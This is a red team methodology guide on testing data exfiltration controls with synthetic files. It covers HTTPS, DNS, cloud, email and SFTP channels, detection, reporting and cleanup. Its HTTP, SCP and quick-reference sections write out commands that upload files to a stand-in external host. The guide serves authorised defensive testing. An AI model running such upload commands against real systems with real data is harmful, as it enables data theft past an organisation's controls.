---
title: Red Team Exfiltration
description: Exfiltration methodology for authorised red team assessments, covering synthetic data transfer, egress validation, HTTP and HTTPS, DNS, cloud and SaaS channels, proxies, DLP, staging, telemetry, detection engineering, evidence, cleanup and reporting.
---

# Red Team Exfiltration

Exfiltration is the process of transferring information from a target environment to another location.

In a real intrusion, adversaries may attempt to remove:

```text
Documents

Credentials

Source code

Database records

Email

Intellectual property

Customer information

Backups

Cloud data
```

In an authorised red team assessment, the objective should normally be different:

```text
Can an attacker who reaches the objective system move controlled
test information across the organisation's security boundary?
```

The safest model is:

```text
Objective Reached
      |
      v
Synthetic Data
      |
      v
Controlled Staging
      |
      v
Approved Egress Channel
      |
      v
Controlled Destination
      |
      v
Detection Validation
      |
      v
Evidence
      |
      v
Cleanup
```

!!! warning "Authorised testing only"
    Exfiltration testing can move information outside organisational trust boundaries. Use synthetic or explicitly approved test data, customer-approved destinations, defined transfer limits and documented stop conditions. Do not transfer real sensitive information merely to prove that an egress path exists.


---

# Exfiltration Objectives

Typical objectives include:

```text
Validate outbound network controls

Validate proxy controls

Validate firewall egress restrictions

Validate DNS monitoring

Validate DLP

Validate cloud-upload controls

Validate endpoint telemetry

Validate SIEM visibility

Validate SOC response

Demonstrate an attack path to the final objective
```


---

# Exfiltration in the Attack Chain

```text
Initial Access
      |
      v
Execution
      |
      v
Discovery
      |
      v
Privilege Escalation
      |
      v
Credential Access
      |
      v
Lateral Movement
      |
      v
Collection
      |
      v
Staging
      |
      v
Exfiltration
      |
      v
Detection / Response
```


---

# Collection vs Exfiltration

Collection answers:

```text
Can the attacker access objective-relevant information?
```

Exfiltration answers:

```text
Can controlled information cross an intended security boundary?
```

These should be separate decisions.

See:

[Collection](collection.md)


---

# Exfiltration Does Not Require Real Data

A common mistake is assuming that exfiltration must involve production information.

It usually does not.

A safer test is:

```text
Generate Synthetic File
        |
        v
Record Hash and Size
        |
        v
Transfer File
        |
        v
Verify Destination
        |
        v
Compare Hash
        |
        v
Check Detection
```

This proves the technical path without exposing production data.


---

# Synthetic Exfiltration Data

Suitable test data can include:

```text
Random bytes

Generated text

Dummy CSV records

Customer-provided marker files

EICAR only when testing malware controls separately

Generated archives

Synthetic documents
```

Do not place real credentials or personal information inside synthetic test files.


---

# Linux Synthetic File

Create a 1 MB random test file:

```bash
dd if=/dev/urandom of=redteam-exfil-test.bin bs=1M count=1 status=progress
```

Record size:

```bash
stat -c '%n %s bytes' redteam-exfil-test.bin
```

Hash:

```bash
sha256sum redteam-exfil-test.bin
```


---

# Windows Synthetic File

Create a 1 MB synthetic file:

```powershell
$data = New-Object byte[] (1MB)
[System.Security.Cryptography.RandomNumberGenerator]::Fill($data)
[System.IO.File]::WriteAllBytes("C:\RedTeamStaging\redteam-exfil-test.bin", $data)
```

Record metadata:

```powershell
Get-Item "C:\RedTeamStaging\redteam-exfil-test.bin" |
    Select-Object Name,Length,LastWriteTime
```

Hash:

```powershell
Get-FileHash -Algorithm SHA256 "C:\RedTeamStaging\redteam-exfil-test.bin"
```


---

# Text-Based Synthetic Dataset

Example:

```text
RecordID,CustomerName,Classification
RT-0001,Synthetic User 1,TEST
RT-0002,Synthetic User 2,TEST
RT-0003,Synthetic User 3,TEST
```

Save it as:

```text
redteam-synthetic-data.csv
```

This can be useful when testing content-aware controls.


---

# Customer-Provided Markers

An organisation can provide:

```text
redteam-objective.txt

redteam-dlp-test.docx

redteam-finance-test.csv

redteam-classified-test.pdf
```

The content can be intentionally designed for:

```text
DLP testing

Classification testing

Proxy testing

Cloud upload testing

SOC validation
```


---

# Exfiltration Planning

Before testing, determine:

```text
What is being transferred?

How large is it?

Where does it originate?

Where will it go?

Which protocol is authorised?

Which destination is authorised?

Which security boundary is being tested?

Which controls should observe it?

What is the maximum transfer volume?

What are the stop conditions?
```


---

# Exfiltration Test Record

Example:

```text
Test ID:
EXFIL-003

Source:
APP01

Identity:
CORP\redteam-user

Data:
Synthetic 1 MB binary file

Protocol:
HTTPS

Destination:
Authorised red team server

Expected Controls:
Firewall
Proxy
EDR
DLP
SIEM

Maximum Transfer:
5 MB

Stop Condition:
Unexpected production data observed
```


---

# Destination Control

The receiving system should be:

```text
Owned by the red team

Owned by the customer

Explicitly approved

Access controlled

Logged

Temporary where appropriate
```

Do not use:

```text
Random public upload services

Personal cloud accounts

Unapproved file-sharing services

Third-party systems outside the engagement
```


---

# Exfiltration Channel Categories

Common channel categories include:

```text
HTTP

HTTPS

DNS

Cloud storage

SaaS applications

Email

File-transfer protocols

Existing application channels

Removable media

C2 channels
```


---

# Exfiltration Channel Model

```text
                      Data
                       |
         +-------------+-------------+
         |             |             |
         v             v             v
       Web            DNS          Cloud
         |             |             |
         v             v             v
    HTTP/HTTPS      Queries       Storage
         |             |             |
         +-------------+-------------+
                       |
                       v
                 Security Controls
                       |
                       v
                    Internet
```


---

# Egress Validation Before Transfer

Before transferring data, validate basic connectivity.

Windows:

```powershell
Test-NetConnection example.com -Port 443
```

Linux:

```bash
nc -vz example.com 443
```

Use only the authorised destination.


---

# DNS Resolution

Windows:

```powershell
Resolve-DnsName example.com
```

Linux:

```bash
dig example.com
```

or:

```bash
getent hosts example.com
```


---

# Proxy Discovery

Many organisations require outbound web traffic through a proxy.

Windows WinHTTP proxy:

```cmd
netsh winhttp show proxy
```

PowerShell environment variables:

```powershell
Get-ChildItem Env: |
    Where-Object Name -Match 'proxy'
```

Linux:

```bash
env | grep -i proxy
```


---

# HTTP and HTTPS

Web protocols are common egress channels because organisations frequently permit outbound web access.

For an authorised synthetic transfer, the objective is to determine:

```text
Can the host connect?

Does a proxy mediate the request?

Is the destination restricted?

Is the upload permitted?

Does DLP inspect the content?

Does the SOC receive useful telemetry?
```


---

# HTTPS Synthetic Upload with curl

For a customer-controlled upload endpoint designed for the engagement:

```bash
curl --fail --show-error --upload-file redteam-exfil-test.bin https://example.com/redteam-upload/redteam-exfil-test.bin
```

The destination must be explicitly authorised.


---

# Windows curl

Modern Windows installations may include `curl.exe`.

Check:

```powershell
Get-Command curl.exe -ErrorAction SilentlyContinue
```

An approved upload can use:

```powershell
curl.exe --fail --show-error --upload-file "C:\RedTeamStaging\redteam-exfil-test.bin" "https://example.com/redteam-upload/redteam-exfil-test.bin"
```


---

# PowerShell HTTP Upload

For a customer-controlled endpoint that accepts an HTTP PUT:

```powershell
Invoke-WebRequest -Uri "https://example.com/redteam-upload/redteam-exfil-test.bin" -Method Put -InFile "C:\RedTeamStaging\redteam-exfil-test.bin"
```

Do not send real customer data to an external destination.


---

# HTTP Evidence

Record:

```text
Source host

Source identity

Destination

Protocol

Timestamp

File size

SHA-256

HTTP result

Proxy involvement

Detection result
```


---

# Verify the Received File

At the receiving system, record:

```bash
sha256sum redteam-exfil-test.bin
```

The source and destination hashes should match.

```text
Source SHA-256
       |
       v
    Transfer
       |
       v
Destination SHA-256
       |
       v
      Match
```


---

# HTTP Status

Record the HTTP status where available.

Possible outcomes include:

```text
200 - Accepted

201 - Created

204 - Accepted without response body

403 - Blocked

407 - Proxy authentication required

413 - Payload too large
```

Interpret the result according to the receiving application.


---

# HTTPS Inspection

An organisation may perform TLS inspection.

Relevant questions include:

```text
Was the TLS connection intercepted?

Could DLP inspect the content?

Was the destination categorised?

Was the upload logged?

Did the proxy identify the user?
```

Do not attempt to bypass TLS inspection merely to make the transfer succeed.


---

# Proxy-Control Validation

A useful validation sequence is:

```text
Direct Egress?
     |
     v
Proxy Required?
     |
     v
Authorised Destination
     |
     v
Upload Attempt
     |
     v
Proxy Log
     |
     v
DLP / SIEM
```


---

# Direct vs Proxy Egress

Record whether traffic:

```text
Leaves directly

Uses explicit proxy

Uses transparent proxy

Is blocked

Requires authentication
```

Unexpected direct internet access from restricted server networks can itself be an important finding.


---

# DNS Exfiltration

DNS can theoretically carry small amounts of encoded information through DNS queries.

For red team testing, avoid transmitting real data through DNS.

A safer validation is to use a synthetic identifier.

Example concept:

```text
Synthetic Marker
      |
      v
DNS Query
      |
      v
Authoritative Test Domain
      |
      v
DNS Logs
      |
      v
Detection
```


---

# DNS Marker Validation

For an engagement-controlled domain:

```bash
dig exfil-test-001.example.com
```

Windows:

```powershell
Resolve-DnsName exfil-test-001.example.com
```

This validates:

```text
DNS resolution path

Resolver visibility

Authoritative DNS visibility

Potential SOC visibility
```

without transmitting sensitive information.


---

# DNS Detection Questions

Determine:

```text
Which resolver received the request?

Was the query logged?

Was the querying host identifiable?

Was the user identifiable?

Did DNS security inspect the domain?

Did the SIEM receive the event?

Was an alert generated?
```


---

# DNS Volume Testing

If DNS analytics are an engagement objective, use customer-approved synthetic labels and conservative volumes.

Do not attempt to optimise:

```text
Encoding density

Query timing

Domain-generation patterns

Detection avoidance
```

The goal is defensive validation, not covert-channel optimisation.


---

# Cloud Storage Exfiltration

Cloud storage can provide an outbound transfer path.

Examples include:

```text
Amazon S3

Azure Blob Storage

Google Cloud Storage
```

Testing should use:

```text
Customer-controlled bucket/container

Red-team-controlled approved account

Synthetic data

Temporary credentials

Logging enabled
```


---

# Cloud Transfer Model

```text
Target Host
     |
     v
Cloud API
     |
     v
Approved Storage
     |
     v
Cloud Audit Log
     |
     v
SIEM
```


---

# Cloud Questions

Ask:

```text
Can the endpoint reach the cloud service?

Is authentication required?

Is the service permitted by proxy policy?

Does CASB/SSE inspect the activity?

Does DLP inspect uploads?

Are cloud API operations logged?

Can the SOC identify the source?
```


---

# SaaS Exfiltration

Potential SaaS channels include:

```text
Enterprise document platforms

Collaboration platforms

Approved file-sharing platforms

Webmail

Source-code platforms
```

Do not use a personal account to test SaaS exfiltration.

Use a customer-approved test tenant or destination.


---

# SaaS Control Model

```text
Endpoint
   |
   v
Proxy / SSE / CASB
   |
   v
SaaS Platform
   |
   v
Application Audit
   |
   v
SIEM
```


---

# Email Exfiltration

Email can transfer information outside the organisation.

Testing should use:

```text
Synthetic attachment

Approved sender

Approved recipient

Defined file size

Customer-controlled mailbox
```

Do not email production-sensitive information to prove the control.


---

# Email Test Example

```text
Sender:
redteam-test@corp.example

Recipient:
approved-redteam@example.com

Subject:
Authorised Exfiltration Validation EXFIL-007

Attachment:
redteam-synthetic-data.csv
```

Record:

```text
Mail gateway result

DLP result

Delivery result

SIEM event

SOC response
```


---

# Email DLP

Possible controls include:

```text
Content classification

Attachment inspection

Sensitive-information types

Recipient restrictions

Domain restrictions

Mail-flow rules
```

A synthetic dataset can be designed to match an approved test policy.


---

# File Transfer Protocols

Organisations may permit:

```text
SFTP

SCP

FTPS

Managed file transfer
```

The important question is whether the channel is:

```text
Expected

Authenticated

Restricted

Monitored

Approved
```

Do not introduce unapproved external file-transfer infrastructure.


---

# SFTP Validation

For an explicitly approved destination:

```bash
sftp redteam@example.com
```

Use a synthetic test file and normal approved authentication.


---

# SCP Validation

For an approved test server:

```bash
scp redteam-exfil-test.bin redteam@example.com:/approved/redteam/
```

This is appropriate only when SSH transfer is explicitly included in the test plan.


---

# Existing Application Channels

An application may already support:

```text
File upload

File export

Webhook

Email

API calls

Cloud integration

Report delivery
```

These existing business channels may provide more realistic exfiltration tests than introducing a new protocol.


---

# Application Export Testing

Example:

```text
Compromised Application Account
            |
            v
       Export Feature
            |
            v
       Synthetic Data
            |
            v
      External Delivery
```

Validate:

```text
Authorisation

DLP

Application audit

Proxy

SIEM

SOC response
```


---

# C2 and Exfiltration

A command-and-control channel can theoretically transport collected information.

However, C2 testing and exfiltration testing should remain conceptually separate.

See:

[Command and Control](command-and-control.md)

The engagement should define whether:

```text
C2 transport is tested only for tasking
```

or:

```text
C2 transport is also approved for synthetic data transfer
```


---

# Exfiltration Over C2

If approved, use:

```text
Small synthetic files

Defined maximum volume

Known timestamps

Controlled destination

Full logging
```

Avoid transferring real sensitive data.


---

# Staging

Collection often precedes exfiltration.

```text
Collection
    |
    v
Staging
    |
    v
Archive
    |
    v
Exfiltration
```

See:

[Collection](collection.md)


---

# Staging Inventory

Before transfer record:

```text
Filename

Size

Hash

Classification

Source

Destination

Test ID
```


---

# Archive Testing

Synthetic test data may be archived before transfer.

Windows:

```powershell
Compress-Archive -Path "C:\RedTeamStaging\TestData\*" -DestinationPath "C:\RedTeamStaging\exfil-test.zip"
```

Linux:

```bash
tar -czf exfil-test.tar.gz redteam-testdata/
```

Record the archive hash.


---

# Windows Archive Hash

```powershell
Get-FileHash -Algorithm SHA256 "C:\RedTeamStaging\exfil-test.zip"
```


---

# Linux Archive Hash

```bash
sha256sum exfil-test.tar.gz
```


---

# Archive Detection

Archive creation may itself be detectable.

Potential telemetry includes:

```text
Process creation

File creation

EDR behavioural analytics

DLP

Filesystem telemetry
```

This allows separate validation of:

```text
Collection/Staging Detection
```

and:

```text
Network Exfiltration Detection
```


---

# Transfer Size

Record exact transfer size.

Windows:

```powershell
(Get-Item "C:\RedTeamStaging\redteam-exfil-test.bin").Length
```

Linux:

```bash
stat -c '%s' redteam-exfil-test.bin
```


---

# Volume-Based Testing

If the engagement specifically tests transfer-volume controls, use progressive synthetic sizes.

Example:

```text
100 KB

1 MB

5 MB

10 MB
```

Do not immediately generate large transfers.


---

# Progressive Testing Model

```text
Small Marker
     |
     v
Detected?
   /      \
 Yes       No
 |          |
Record      v
       Small File
           |
           v
       Detected?
        /     \
      Yes      No
      |         |
    Record      v
          Larger Test
          If Required
```

Stop once the objective is demonstrated.


---

# Bandwidth Safety

Exfiltration tests should not:

```text
Saturate production links

Interfere with backups

Impact business applications

Create unexpected cloud costs

Trigger storage exhaustion
```

Define maximum:

```text
File size

Total bytes

Requests

Transfer rate

Test duration
```


---

# Egress Filtering

A mature environment may restrict outbound traffic according to:

```text
Source network

Destination

Port

Protocol

Application

User

Device identity

URL category
```


---

# Egress Testing Questions

Ask:

```text
Can servers directly access the internet?

Can workstations directly access the internet?

Must traffic use a proxy?

Are unknown destinations blocked?

Are uncommon ports blocked?

Are DNS requests restricted to approved resolvers?

Can cloud-storage services be reached?

Are uploads inspected?
```


---

# Server Egress

Servers often require stricter outbound policy than workstations.

A useful security boundary is:

```text
Server
  |
  v
Approved Proxy / Gateway
  |
  v
Approved Destinations
```

Unexpected unrestricted server egress may increase the impact of a server compromise.


---

# DNS Egress

A mature architecture may require:

```text
Endpoint
   |
   v
Approved DNS Resolver
   |
   v
Security Inspection
   |
   v
Internet DNS
```

Direct external DNS should normally be restricted where architecture permits.


---

# Firewall Telemetry

Potential evidence includes:

```text
Allowed connection

Blocked connection

Source IP

Destination IP

Port

Protocol

Bytes transferred

Timestamp
```


---

# Proxy Telemetry

Potential fields include:

```text
User

Device

Source IP

Destination

URL

Method

Status

Request size

Response size

Category

TLS inspection status
```


---

# Network Detection

Network monitoring may identify:

```text
Large outbound transfers

Rare destinations

Unusual protocols

Unexpected server internet access

Long-lived connections

Unusual DNS behaviour

Cloud-storage uploads
```


---

# Endpoint Detection

Endpoint controls may observe:

```text
File reads

Archive creation

Process execution

Network connections

Browser activity

PowerShell

Command-line tools
```


---

# DLP Detection

DLP can operate at:

```text
Endpoint

Email gateway

Web proxy

Cloud applications

SaaS

Storage
```

Synthetic data can test whether classification policies work without exposing real sensitive information.


---

# DLP Test Data

A customer can create a synthetic document intentionally containing:

```text
Test classification labels

Synthetic account numbers

Synthetic identifiers

Test keywords

Dummy confidential markings
```

Coordinate the exact content with the defensive team.


---

# DLP Test Model

```text
Synthetic Sensitive File
          |
          v
       Endpoint
          |
          v
       Upload
          |
          v
         DLP
       /     \
    Block    Allow
      |        |
      v        v
   Alert?    Alert?
      |        |
      +---+----+
          |
          v
         SOC
```


---

# CASB and SSE

Modern organisations may use:

```text
CASB

Secure Web Gateway

Security Service Edge

Zero Trust Network Access
```

These controls may provide visibility into:

```text
Cloud uploads

Unsanctioned SaaS

User identity

Device identity

Content classification
```


---

# Cloud Audit

Cloud destinations may provide logs for:

```text
Authentication

Object creation

Object upload

API calls

Source address

Identity

Timestamp
```


---

# SIEM Validation

Confirm that telemetry reaches the SIEM.

A network device logging the transfer does not automatically mean:

```text
SOC visibility exists.
```

Validate the complete chain:

```text
Source
   |
   v
Security Control
   |
   v
Log Source
   |
   v
Collector
   |
   v
SIEM
   |
   v
Detection
   |
   v
Analyst
```


---

# Exfiltration Detection Hypothesis

Example:

```text
Hypothesis:
A compromised server uploading a synthetic archive to an
uncommon external HTTPS destination should generate proxy,
endpoint and SIEM telemetry.

Test:
Transfer a 1 MB synthetic archive to the approved red team
HTTPS endpoint.

Expected:
The proxy records the upload, endpoint telemetry identifies the
originating process and the SIEM generates a suspicious outbound
transfer alert.

Result:
Record prevention, telemetry, alerting and SOC response.
```


---

# DNS Detection Hypothesis

```text
Hypothesis:
Repeated DNS requests containing engagement-specific synthetic
markers should be visible through DNS security telemetry.

Test:
Generate a small approved sequence of DNS lookups against the
engagement-controlled domain.

Expected:
DNS telemetry identifies the source host and queried domain.

Result:
Record whether the activity is logged, alerted and investigated.
```


---

# DLP Detection Hypothesis

```text
Hypothesis:
A synthetic document matching the approved test classification
should trigger the organisation's outbound DLP controls.

Test:
Upload the synthetic document to the approved destination.

Expected:
The transfer is blocked or alerted according to policy.

Result:
Record policy action and analyst response.
```


---

# Detection Outcomes

Classify each test as:

```text
Prevented

Allowed and Detected

Allowed and Logged

Allowed without Alert

No Useful Visibility
```


---

# Prevention vs Detection

Keep them separate.

Example:

```text
Transfer:
Allowed

Proxy:
Logged

DLP:
No Alert

SIEM:
No Alert
```

This is different from:

```text
Transfer:
Blocked

DLP:
Alerted

SIEM:
Alerted
```


---

# Response Validation

If the exercise includes SOC response, record:

```text
Did an analyst investigate?

How quickly?

Was the source host identified?

Was the user identified?

Was the destination identified?

Was the transferred file identified?

Was containment initiated?

Was the activity escalated?
```


---

# Exfiltration Timeline

Example:

```text
15:00 - Synthetic file generated
15:02 - SHA-256 recorded
15:05 - HTTPS connectivity confirmed
15:07 - Upload initiated
15:07 - Upload completed
15:08 - Destination hash confirmed
15:10 - Proxy event identified
15:12 - SIEM event identified
15:14 - SOC alert generated
15:19 - Analyst triage started
15:27 - Host identified
15:31 - Test closed
```


---

# Metrics

Useful metrics include:

```text
Transfer size

Transfer duration

Transfer rate

Time to telemetry

Time to alert

Time to triage

Time to identify source

Time to containment

Number of controls triggered
```


---

# Time to Detect

```text
TTD = Alert Time - Exfiltration Start Time
```


---

# Time to Triage

```text
TTT = Analyst Triage Time - Alert Time
```


---

# Time to Response

```text
TTR = Response Time - Detection Time
```


---

# Evidence

For every exfiltration test record:

```text
Test ID

Source host

Source identity

Source file

Synthetic/real classification

File size

SHA-256

Protocol

Destination

Timestamp

Transfer result

Destination hash

Firewall result

Proxy result

DLP result

EDR result

SIEM result

SOC response

Cleanup status
```


---

# Evidence Example

```text
Test ID:
EXFIL-004

Source:
APP01

Identity:
CORP\svc-app-test

File:
redteam-exfil-test.bin

Data:
Synthetic

Size:
1,048,576 bytes

Protocol:
HTTPS

Destination:
Approved red team endpoint

Result:
Transfer successful

Source SHA-256:
<hash>

Destination SHA-256:
<matching hash>

Proxy:
Logged

DLP:
No alert

SIEM:
Proxy event ingested

SOC:
No alert generated

Cleanup:
Source and destination test files removed
```


---

# Candidate vs Confirmed

## Candidate

```text
The server appears to have unrestricted outbound HTTPS access.
```


## Likely

```text
Connectivity to the approved external destination succeeds and
the proxy permits the destination.
```


## Confirmed

```text
The server successfully transferred the approved synthetic test
file to the controlled external destination.
```


---

# Accurate Reporting

Avoid:

```text
All company data can be exfiltrated.
```

when the test only demonstrated:

```text
A 1 MB synthetic file could be transferred over HTTPS from one
tested server.
```

Prefer:

```text
The assessment confirmed that the tested application server
could transfer a 1 MB synthetic file to the approved external
HTTPS destination. The assessment did not transfer production
customer data or perform high-volume exfiltration testing.
```


---

# Example Finding - Unrestricted Server Egress

```text
Title:
Application Servers Permit Unrestricted Direct Internet Egress

Observation:
During the authorised exfiltration test, the compromised
application server established a direct outbound HTTPS
connection to the approved red team destination.

The connection did not require the organisation's authenticated
web proxy.

A 1 MB synthetic file was successfully transferred.

Impact:
An attacker who compromises the affected server may be able to
communicate directly with external infrastructure and transfer
information without passing through the organisation's intended
proxy enforcement point.

Recommendation:
Restrict server internet egress to explicitly required
destinations and services. Route required web traffic through
managed inspection controls and monitor unusual outbound
connections from server networks.
```


---

# Example Finding - DLP Visibility Gap

```text
Title:
Synthetic Sensitive Data Upload Is Not Detected by Outbound DLP

Observation:
A customer-approved synthetic document matching the engagement
test classification was uploaded to the authorised external
destination.

The transfer was permitted and no DLP alert was observed during
the agreed validation window.

Proxy telemetry confirmed the transfer.

Impact:
An attacker with access to similarly classified information may
be able to transfer data through the tested channel without
triggering the expected DLP detection.

Recommendation:
Review DLP coverage for the tested protocol and endpoint class.
Validate policy deployment, content inspection, alert forwarding
and SIEM integration using repeatable synthetic test cases.
```


---

# Example Finding - Direct External DNS

```text
Title:
Server Network Permits Direct DNS Resolution Outside Approved Resolvers

Observation:
The assessment identified that systems within the tested server
network could communicate with DNS infrastructure outside the
organisation's intended resolver path.

Validation used only engagement-specific synthetic DNS queries.

Impact:
Direct DNS egress can reduce central DNS visibility and may
provide an additional communication path following server
compromise.

Recommendation:
Restrict outbound DNS to approved organisational resolvers and
monitor attempts to communicate directly with external DNS
services.
```


---

# Example Positive Security Result

```text
Control:
Endpoint DLP

Test:
A customer-approved synthetic classified document was uploaded
to the approved external HTTPS destination.

Result:
The endpoint DLP agent blocked the transfer and generated an
alert containing the source host, user and file classification.

SIEM:
Alert successfully ingested.

SOC:
Analyst triage began within four minutes.

Conclusion:
The tested exfiltration path was successfully prevented and
detected.
```


---

# Root Causes

Exfiltration weaknesses may result from:

```text
Unrestricted outbound access

Missing server egress filtering

Proxy bypass paths

Direct external DNS

Insufficient DLP coverage

Missing cloud controls

Insufficient SaaS governance

Weak network segmentation

Missing endpoint telemetry

Missing SIEM ingestion

Detection-rule gaps
```


---

# Remediation - Network

Consider:

```text
Default-deny server egress

Explicit destination allowlists

Managed proxy enforcement

DNS resolver enforcement

Network segmentation

Outbound firewall rules

Application-aware controls
```


---

# Remediation - Endpoint

Consider:

```text
Endpoint DLP

EDR network telemetry

Application control

File classification

Archive monitoring

Browser controls

Device controls
```


---

# Remediation - Proxy

Consider:

```text
Authenticated proxy

URL categorisation

Destination controls

Upload inspection

TLS inspection where appropriate

User/device attribution

SIEM integration
```


---

# Remediation - DNS

Consider:

```text
Approved resolvers only

Block direct external DNS

DNS logging

Protective DNS

Domain reputation

Analytics for unusual query patterns

SIEM integration
```


---

# Remediation - Cloud and SaaS

Consider:

```text
CASB/SSE controls

Approved SaaS applications

Tenant restrictions

Cloud audit logging

DLP

Conditional access

Managed identities

Least privilege
```


---

# Remediation - Detection

Consider:

```text
Large outbound transfer analytics

Rare destination detection

Server internet-access detection

DNS anomaly detection

Archive creation detection

Cloud upload detection

DLP correlation

Identity enrichment
```


---

# Retesting

After remediation:

```text
Repeat Same Synthetic Test
          |
          v
Same Source
          |
          v
Same Destination
          |
          v
Same File Size
          |
          v
Compare Result
```

Consistency makes before-and-after comparison meaningful.


---

# Retest Status

Use:

```text
Resolved

Partially Resolved

Not Resolved

Not Retested

Risk Accepted
```


---

# Cleanup

Exfiltration testing may leave artifacts on both sides of the security boundary.

Potential artifacts include:

```text
Synthetic source files

Archives

Temporary staging directories

Uploaded destination files

Temporary cloud objects

Temporary accounts

Test DNS records

Web server logs

Transfer logs
```


---

# Source Cleanup - Windows

Review:

```powershell
Get-ChildItem "C:\RedTeamStaging" -Force -ErrorAction SilentlyContinue
```

Remove approved temporary artifacts:

```powershell
Remove-Item "C:\RedTeamStaging\redteam-exfil-test.bin" -Force -ErrorAction SilentlyContinue
```

Verify:

```powershell
Test-Path "C:\RedTeamStaging\redteam-exfil-test.bin"
```


---

# Source Cleanup - Linux

Remove the synthetic test artifact:

```bash
rm -f redteam-exfil-test.bin
```

Verify:

```bash
test ! -e redteam-exfil-test.bin && echo "Test artifact removed"
```


---

# Destination Cleanup

The receiving infrastructure should also be reviewed.

Verify:

```text
Uploaded file removed

Temporary account removed

Temporary token revoked

Temporary bucket/container cleaned

Temporary DNS records removed

Temporary upload endpoint disabled
```


---

# Cleanup Evidence

Record:

```text
Artifact

Source/destination

Cleanup action

Verification

Timestamp

Operator
```


---

# Exfiltration Checklist

## Planning

- [ ] Objective defined
- [ ] Exfiltration explicitly authorised
- [ ] Source system confirmed in scope
- [ ] Destination approved
- [ ] Protocol approved
- [ ] Synthetic data selected
- [ ] Maximum transfer volume defined
- [ ] Maximum duration defined
- [ ] Stop conditions defined
- [ ] Expected controls identified

## Test Data

- [ ] No real sensitive data required
- [ ] Synthetic file generated
- [ ] Filename recorded
- [ ] Size recorded
- [ ] SHA-256 recorded
- [ ] Classification recorded
- [ ] Test ID assigned

## Network

- [ ] Source network identified
- [ ] Routes understood
- [ ] DNS path understood
- [ ] Proxy configuration reviewed
- [ ] Firewall controls identified
- [ ] Direct vs proxied egress understood
- [ ] Destination reachability validated

## HTTP/HTTPS

- [ ] Approved endpoint used
- [ ] Transfer size controlled
- [ ] HTTP result recorded
- [ ] Proxy result recorded
- [ ] TLS inspection considered
- [ ] Destination hash verified

## DNS

- [ ] Engagement-controlled domain used
- [ ] Synthetic labels only
- [ ] Approved resolver path identified
- [ ] Query volume controlled
- [ ] DNS logs reviewed
- [ ] SIEM visibility reviewed

## Cloud/SaaS

- [ ] Approved tenant/account used
- [ ] Approved storage used
- [ ] Synthetic data only
- [ ] Cloud audit logs reviewed
- [ ] CASB/SSE considered
- [ ] DLP considered
- [ ] Temporary objects tracked

## Email

- [ ] Approved sender used
- [ ] Approved recipient used
- [ ] Synthetic attachment used
- [ ] Mail gateway result recorded
- [ ] DLP result recorded
- [ ] Delivery result recorded
- [ ] Mail audit reviewed

## Detection

- [ ] Endpoint telemetry reviewed
- [ ] Firewall telemetry reviewed
- [ ] Proxy telemetry reviewed
- [ ] DNS telemetry reviewed
- [ ] DLP telemetry reviewed
- [ ] Cloud/SaaS telemetry reviewed
- [ ] SIEM ingestion confirmed
- [ ] Alert status recorded
- [ ] SOC response recorded

## Evidence

- [ ] Test ID recorded
- [ ] Source host recorded
- [ ] Source identity recorded
- [ ] Destination recorded
- [ ] Protocol recorded
- [ ] File size recorded
- [ ] Source hash recorded
- [ ] Destination hash recorded
- [ ] Start/end timestamps recorded
- [ ] Detection outcome recorded

## Cleanup

- [ ] Source artifact removed
- [ ] Source archive removed
- [ ] Destination artifact removed
- [ ] Temporary cloud object removed
- [ ] Temporary credentials revoked
- [ ] Temporary DNS records removed
- [ ] Upload endpoint reviewed
- [ ] Cleanup verified


---

# Quick Reference - Windows

## Connectivity

```powershell
Test-NetConnection example.com -Port 443
```


## DNS

```powershell
Resolve-DnsName example.com
```


## Proxy

```cmd
netsh winhttp show proxy
```


## Proxy Environment

```powershell
Get-ChildItem Env: |
    Where-Object Name -Match 'proxy'
```


## Generate Synthetic File

```powershell
$data = New-Object byte[] (1MB)
[System.Security.Cryptography.RandomNumberGenerator]::Fill($data)
[System.IO.File]::WriteAllBytes("C:\RedTeamStaging\redteam-exfil-test.bin", $data)
```


## File Size

```powershell
(Get-Item "C:\RedTeamStaging\redteam-exfil-test.bin").Length
```


## Hash

```powershell
Get-FileHash -Algorithm SHA256 "C:\RedTeamStaging\redteam-exfil-test.bin"
```


## Archive Synthetic Data

```powershell
Compress-Archive -Path "C:\RedTeamStaging\TestData\*" -DestinationPath "C:\RedTeamStaging\exfil-test.zip"
```


## Approved HTTPS Upload

```powershell
curl.exe --fail --show-error --upload-file "C:\RedTeamStaging\redteam-exfil-test.bin" "https://example.com/redteam-upload/redteam-exfil-test.bin"
```


---

# Quick Reference - Linux

## Connectivity

```bash
nc -vz example.com 443
```


## DNS

```bash
dig example.com
```


## Proxy

```bash
env | grep -i proxy
```


## Generate Synthetic File

```bash
dd if=/dev/urandom of=redteam-exfil-test.bin bs=1M count=1 status=progress
```


## Size

```bash
stat -c '%n %s bytes' redteam-exfil-test.bin
```


## Hash

```bash
sha256sum redteam-exfil-test.bin
```


## Archive Synthetic Data

```bash
tar -czf exfil-test.tar.gz redteam-testdata/
```


## Approved HTTPS Upload

```bash
curl --fail --show-error --upload-file redteam-exfil-test.bin https://example.com/redteam-upload/redteam-exfil-test.bin
```


## Approved SFTP

```bash
sftp redteam@example.com
```


## Approved SCP

```bash
scp redteam-exfil-test.bin redteam@example.com:/approved/redteam/
```


---

# Exfiltration Decision Model

```text
                     OBJECTIVE
                         |
                         v
                EXFIL TEST REQUIRED?
                   /           \
                 No             Yes
                 |               |
                STOP             v
                         DATA SYNTHETIC?
                           /         \
                         No           Yes
                         |             |
                         v             v
                    Can Synthetic   DESTINATION
                    Replace It?     APPROVED?
                     /      \         /     \
                   Yes      No       No     Yes
                   |         |       |       |
                   v         v      STOP     v
               Generate   ROE /         PROTOCOL
               Test Data  Approval       APPROVED?
                           Check          /     \
                                       No       Yes
                                       |         |
                                      STOP       v
                                           SIZE LIMIT
                                              |
                                              v
                                            TRANSFER
                                              |
                           +------------------+------------------+
                           |                  |                  |
                           v                  v                  v
                        Network             DLP               Endpoint
                           |                  |                  |
                           +------------------+------------------+
                                              |
                                              v
                                             SIEM
                                              |
                                              v
                                           RESPONSE
                                              |
                                              v
                                            EVIDENCE
                                              |
                                              v
                                            CLEANUP
```


---

# Exfiltration Detection Model

```text
                       TARGET HOST
                            |
                            v
                        TEST DATA
                            |
                            v
                         PROCESS
                            |
                            v
                         NETWORK
                            |
             +--------------+--------------+
             |              |              |
             v              v              v
          Firewall         Proxy           DNS
             |              |              |
             +--------------+--------------+
                            |
                            v
                           DLP
                            |
                            v
                     External Boundary
                            |
                            v
                    Approved Destination

Telemetry:

Endpoint --------+
Firewall --------+
Proxy -----------+----> SIEM ----> Detection ----> SOC
DNS -------------+
